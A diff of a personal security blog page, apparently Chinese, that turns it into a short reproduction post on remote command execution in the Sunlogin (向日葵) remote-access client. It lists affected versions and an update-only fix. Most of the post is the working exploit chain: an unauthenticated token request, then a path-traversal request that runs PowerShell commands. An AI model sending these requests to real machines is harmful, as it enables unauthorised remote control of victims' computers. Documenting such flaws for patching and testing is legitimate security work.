@@ -1,9 +1,9 @@
 <!DOCTYPE html>
 <html>
-       <head>
+        <head>
         <meta name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no" />
         <meta charset="utf-8">
-        <title>漏洞详情 | 老白</title>
+        <title>向日葵RCE | 老白</title>
         <link rel="stylesheet" href="https://V-alkoinen.github.io/styles/main.css">
         <link rel="stylesheet" href="https://at.alicdn.com/t/font_1306644_jwtuc2zzbrd.css">
         <link href="https://cdn.bootcss.com/animate.css/3.7.2/animate.min.css" rel="stylesheet">
@@ -14,7 +14,7 @@
 
     </head>
     <body>
-          <header class="header mdui-m-b-5">      
+              <header class="header mdui-m-b-5">      
             <div class="container  ">
                 <div class="index-title animated fadeInDown mdui-text-center mdui-text-color-white mdui-m-b-2" style="animation-delay: 0.2s"><a href="https://V-alkoinen.github.io">老白</a></div>
                 <div class="mdui-text-color-white animated fadeInDown mdui-text-center  mdui-m-b-3" style="animation-delay: 0.4s"></div>
@@ -47,33 +47,87 @@
         </header>
         <div class="mdui-container ">
                 <div class="mdui-row">
-                        <div class="mdui-col-md-8 mdui-col-offset-md-2 mdui-m-t-1">
-                                                         
-                               <article class="mdui-p-a-5 index-list mdui-m-b-3 animated fadeIn" style="animation-delay: 0.8s;animation-duration: 2s">
-                                    <div class="mdui-typo-body-2 mdui-m-b-1" datetime="2021-04-09 16:22:23">2021-04-09</div>
-                                    <div class="mdui-typo-headline mdui-m-b-3 index-list-title index-guo"><a href="https://V-alkoinen.github.io/post/spring-boot-actuator-wei-shou-quan-fang-wen/">Spring Boot Actuator 未授权访问</a></div>
-                                    <div class="mdui-typo-subheading mdui-m-b-2 index-neirong"></div>
-                                    <div class="index-list-rm index-guo"><a href="https://V-alkoinen.github.io/post/spring-boot-actuator-wei-shou-quan-fang-wen/">Read More</a></div>
-                                </article>
-                                
-                               <article class="mdui-p-a-5 index-list mdui-m-b-3 animated fadeIn" style="animation-delay: 0.8s;animation-duration: 2s">
-                                    <div class="mdui-typo-body-2 mdui-m-b-1" datetime="2020-01-25 15:04:44">2020-01-25</div>
-                                    <div class="mdui-typo-headline mdui-m-b-3 index-list-title index-guo"><a href="https://V-alkoinen.github.io/post/subdomain-takeover-via-shopify/">Subdomain Takeover Via Shopify</a></div>
-                                    <div class="mdui-typo-subheading mdui-m-b-2 index-neirong"></div>
-                                    <div class="index-list-rm index-guo"><a href="https://V-alkoinen.github.io/post/subdomain-takeover-via-shopify/">Read More</a></div>
-                                </article>
-                                
-                                                            <nav class="mdui-m-t-5">
-                                
-                                <div class="index-yema mdui-float-left"><a href="https://V-alkoinen.github.io/tag/Oz6wCd1f5">上一页</a></div>
-                                 
-                                
-                                </nav>     
+                        <div class="mdui-col-md-8 mdui-col-offset-md-2 ">
+                                <article class="mdui-p-a-2 post animated fadeIn" style="animation-delay: 0.8s;animation-duration: 2s">
+                                    <div class="post-title  mdui-m-b-1">向日葵RCE</div>
+                                    <div class="mdui-typo-body-2 mdui-m-b-2" datetime="2022-02-16 19:41:52">2022-02-16 / 1 min read</div>
+                                    <div class="mdui-m-b-2 mdui-typo post-neirong"><h1 id="影响范围">影响范围</h1>
+<p> 11.1.1.x<br>
+ 10.3.0.27372<br>
+ 11.0.0.33162</p>
+<h1 id="漏洞复现">漏洞复现</h1>
+<p> 查看向日葵开放端口：</p>
+<pre><code>tasklist | findstr Sunlogin
+#查找PID
 
+netstat -ano | findstr &lt;pid&gt;
+#查找端口
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1645157954635.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1645157959994.png" alt="" loading="lazy"><br>
+ 获取token</p>
+<pre><code>GET /cgi-bin/rpc?action=verify-haras HTTP/1.1
+Host: &lt;ip&gt;:&lt;port&gt;
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1645157986350.png" alt="" loading="lazy"><br>
+ 执行命令</p>
+<pre><code>GET /Check?cmd=ping%2e%2e%2f%2e%2e%2fWindows/system32/WindowsPowerShell/v1%2e0/powershell.exe+ipconfig HTTP/1.1
+Host: &lt;ip&gt;:&lt;port&gt;
+Cookie: CID=&lt;token&gt;
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1645158015142.png" alt="" loading="lazy"><br>
+ 也可以使用github上的exp<br>
+<img src="https://V-alkoinen.github.io/post-images/1645158303650.png" alt="" loading="lazy"></p>
+<h1 id="漏洞修复">漏洞修复</h1>
+<p> 更新向日葵至最新版</p>
+</div>
+                                    <div class="mdui-divider mdui-m-b-2"></div>
+                                    <div class="mdui-row-xs-2 post-fenye">
+                                       
+                                        <div class="mdui-col"> </div>
+                                        
+
+                                        
+                                        <div class="mdui-col"><div class="mdui-text-right "><a href="https://V-alkoinen.github.io/post/cve-2021-4034-polkit-local-privilege-escalation/">CVE-2021-4034 Polkit local privilege escalation</a></div> </div>
+                                       
+                                      </div>
+                                   
+                                    <div class="mdui-divider mdui-m-t-2 mdui-m-b-2"></div>
+                                    
+                                     <script src="https://V-alkoinen.github.io/media/scripts/Valine.min.js"></script>
+ <div class="comment"></div>
+
+<script>
+      new Valine({
+            el: '.comment',
+
+
+
+            path: window.location.pathname,
+            pageSize: 30,
+            avatar:'mm', 
+       })
+    </script> 
+<script>
+    if(window.location.hash){
+        var checkExist = setInterval(function() {
+           if ($(window.location.hash).length) {
+              $('html, body').animate({scrollTop: $(window.location.hash).offset().top-90}, 1000);
+              clearInterval(checkExist);
+           }
+        }, 100);
+    }
+</script>
+                                </article>
+
+                                    
                         </div>
                       </div>
+    
+                
+
               </div>
-                <footer class="footer mdui-m-t-5 mdui-text-center">
+                    <footer class="footer mdui-m-t-5 mdui-text-center">
                <nav class="social-links">
                       <ul>
                       
